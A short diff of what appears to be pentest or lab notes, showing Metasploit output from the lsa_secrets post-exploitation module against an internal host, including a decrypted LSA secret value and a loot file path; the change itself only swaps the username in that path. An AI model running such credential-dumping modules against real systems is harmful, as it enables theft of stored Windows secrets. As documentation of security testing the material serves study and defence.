@@ -796,7 +796,7 @@ msf post(lsa_secrets) > run
  Decrypted Value: .Carried_mass_it_reader1
 
 [*] Writing to loot...
-[*] Data saved in: /home/vladg/.msf4/loot/20180109050031_default_10.142.0.8_registry.lsa.sec_967944.txt
+[*] Data saved in: /home/holiday/.msf4/loot/20180109050031_default_10.142.0.8_registry.lsa.sec_967944.txt
 [*] Post module execution completed
 #+END_SRC
 
